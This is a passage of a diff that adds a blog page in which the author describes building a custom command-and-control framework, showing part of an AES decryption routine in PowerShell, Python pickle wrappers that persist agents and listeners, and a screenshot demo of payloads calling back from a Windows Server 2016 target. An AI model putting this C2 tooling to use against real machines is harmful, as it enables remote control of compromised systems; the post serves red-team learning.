+    </span><span class="nv">$bytes</span><span class="w">           </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$encryptedStringWithIV</span><span class="p">)</span><span class="w">
+    </span><span class="nv">$IV</span><span class="w">              </span><span class="o">=</span><span class="w"> </span><span class="nv">$bytes</span><span class="p">[</span><span class="mi">0</span><span class="o">..</span><span class="mi">15</span><span class="p">]</span><span class="w">
+    </span><span class="nv">$aesManaged</span><span class="w">      </span><span class="o">=</span><span class="w"> </span><span class="n">Create-AesManagedObject</span><span class="w"> </span><span class="nv">$key</span><span class="w"> </span><span class="nv">$IV</span><span class="w">
+    </span><span class="nv">$decryptor</span><span class="w">       </span><span class="o">=</span><span class="w"> </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">CreateDecryptor</span><span class="p">();</span><span class="w">
+    </span><span class="nv">$unencryptedData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$decryptor</span><span class="o">.</span><span class="nf">TransformFinalBlock</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">16</span><span class="p">,</span><span class="w"> </span><span class="nv">$bytes</span><span class="o">.</span><span class="nf">Length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">16</span><span class="p">);</span><span class="w">
+    </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">Dispose</span><span class="p">()</span><span class="w">
+    </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8.GetString</span><span class="p">(</span><span class="nv">$unencryptedData</span><span class="p">)</span><span class="o">.</span><span class="nf">Trim</span><span class="p">([</span><span class="n">char</span><span class="p">]</span><span class="nx">0</span><span class="p">)</span><span class="w">
+
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="listeners--agents-persistency">Listeners / Agents Persistency</h2>
+
+<p>I used <code class="language-plaintext highlighter-rouge">pickle</code> to serialize agents and listeners and save them in databases, when you exit the server it saves all of the agent objects and listeners, then when you start it again it loads those objects again so you don’t lose your agents or listeners.<br></p>
+
+<p>For the listeners, <code class="language-plaintext highlighter-rouge">pickle</code> can’t serialize objects that use threads, so instead of saving the objects themselves I created a dictionary that holds all the information of the active listeners and serialized that, the server loads that dictionary and starts the listeners again according to the options in the dictionary.<br></p>
+
+<p>I created wrapper functions that read, write and remove objects from the databases:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">readFromDatabase</span><span class="p">(</span><span class="n">database</span><span class="p">):</span>
+    
+    <span class="n">data</span> <span class="o">=</span> <span class="p">[]</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">database</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">d</span><span class="p">:</span>
+        
+        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">pickle</span><span class="p">.</span><span class="n">load</span><span class="p">(</span><span class="n">d</span><span class="p">))</span>
+            <span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
+                <span class="k">break</span>
+    
+    <span class="k">return</span> <span class="n">data</span>
+
+<span class="k">def</span> <span class="nf">writeToDatabase</span><span class="p">(</span><span class="n">database</span><span class="p">,</span><span class="n">newData</span><span class="p">):</span>
+    
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">database</span><span class="p">,</span> <span class="s">"ab"</span><span class="p">)</span> <span class="k">as</span> <span class="n">d</span><span class="p">:</span>
+        <span class="n">pickle</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="n">newData</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">pickle</span><span class="p">.</span><span class="n">HIGHEST_PROTOCOL</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">removeFromDatabase</span><span class="p">(</span><span class="n">database</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
+    
+    <span class="n">data</span> <span class="o">=</span> <span class="n">readFromDatabase</span><span class="p">(</span><span class="n">database</span><span class="p">)</span>
+    <span class="n">final</span> <span class="o">=</span> <span class="n">OrderedDict</span><span class="p">()</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+        <span class="n">final</span><span class="p">[</span><span class="n">i</span><span class="p">.</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span>
+    
+    <span class="k">del</span> <span class="n">final</span><span class="p">[</span><span class="n">name</span><span class="p">]</span>
+    
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">database</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">d</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">final</span><span class="p">:</span>
+            <span class="n">pickle</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="n">final</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">d</span> <span class="p">,</span> <span class="n">pickle</span><span class="p">.</span><span class="n">HIGHEST_PROTOCOL</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="demo">Demo</h2>
+
+<p>I will show you a quick demo on a Windows Server 2016 target.<br></p>
+
+<p>This is how the home of the server looks like:</p>
+
+<p><br><img src="/images/misc/c2/1.png" alt="" class="align-center"><br><br></p>
+
+<p>Let’s start by creating a listener:</p>
+
+<p><br><img src="/images/misc/c2/2.png" alt="" class="align-center"><br><br></p>
+
+<p>Now let’s create a payload, I created the three available payloads:</p>
+
+<p><br><img src="/images/misc/c2/3.png" alt="" class="align-center"><br><br></p>
+
+<p>After executing the payloads on the target we’ll see that the agents successfully contacted the server:</p>
+
+<p><br><img src="/images/misc/c2/4.png" alt="" class="align-center"><br><br></p>
+
+<p>Let’s rename the agents:</p>
+
+<p><br><img src="/images/misc/c2/5.png" alt="" class="align-center"><br>
+<img src="/images/misc/c2/6.png" alt="" class="align-center"><br><br></p>
+
+<p>I executed 4 simple commands on each agent:</p>
+
+<p><br><img src="/images/misc/c2/7.png" alt="" class="align-center"><br>
+<img src="/images/misc/c2/8.png" alt="" class="align-center"><br>
+<img src="/images/misc/c2/9.png" alt="" class="align-center"><br><br></p>
+
+<p>Then I tasked each agent to quit.<br></p>
+
+<p>And that concludes this blog post, as I said before I would appreciate all the feedback and the suggestions so feel free to contact me on twitter <a href="https://www.twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>.<br></p>
+
+<p>If you liked the article tweet about it, thanks for reading.<br></p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-04-16T03:00:00+02:00">April 16, 2020</time></p>
+
+
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/hack-the-box/ai/" class="pagination--pager" title="Hack The Box - AI
+">Previous</a>
+    
+    
+      <a href="/win-internals/pe1/" class="pagination--pager" title="A dive into the PE file format - Introduction
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+    <ul class="social-icons">
+      
+  
+      
+  
+      
+    </ul>
+  </div>
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
+</script>
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
